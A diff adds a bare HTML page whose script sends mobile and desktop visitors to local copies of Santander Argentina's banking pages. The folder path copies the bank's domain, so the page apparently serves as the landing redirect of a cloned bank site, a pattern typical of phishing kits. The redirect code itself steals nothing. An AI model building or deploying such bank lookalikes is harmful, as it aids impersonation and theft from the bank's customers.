@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        (function() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            var isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(userAgent);
+            
+            if (isMobile) {
+                window.location.href = '/https:/www.personas.santander.com.ar/indexMovil.html';
+            } else {
+                window.location.href = '/https:/www.personas.santander.com.ar/indexDesktop.html';
+            }
+        })();
+    </script>
+</body>
+</html>
